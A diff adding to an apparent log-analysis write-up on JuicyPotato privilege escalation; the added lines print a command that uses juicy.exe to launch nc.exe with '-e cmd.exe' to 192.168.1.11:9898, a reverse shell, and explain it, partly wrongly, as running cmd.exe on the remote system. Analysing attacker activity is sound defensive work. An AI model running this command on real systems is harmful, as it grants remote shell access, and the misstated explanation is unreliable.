@@ -80,3 +80,13 @@ This command downloads `JuicyPotato.exe` from the specified URL and saves it as 
 
 - **Explanation:** The attacker uses `juicy.exe` to establish a netcat shell back to their system with the command:
 
+```
+  juicy.exe -l 9999 -p nc.exe -a "192.168.1.11 9898 -e cmd.exe"
+```
+
+
+In summary, the command sets up a connection to a remote system (`192.168.1.11` at port `9898`) and executes `cmd.exe` on that system using the `nc.exe` payload.
+
+---
+
+**Note:** Always ensure that you have permission to analyze any logs or systems you encounter and that you are following ethical guidelines.
